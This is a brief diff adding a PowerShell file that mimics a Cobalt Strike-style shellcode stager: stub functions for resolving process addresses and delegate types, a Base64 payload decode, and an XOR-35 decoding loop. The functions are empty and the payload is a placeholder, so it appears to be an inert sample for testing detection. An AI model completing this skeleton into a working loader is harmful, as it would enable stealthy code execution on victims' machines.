@@ -1,0 +1,6 @@
+Set-StrictMode -Version 2
+function func_get_proc_address { }
+function func_get_delegate_type { }
+$var_code = [System.Convert]::FromBase64String("AAAA")
+for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 }
+
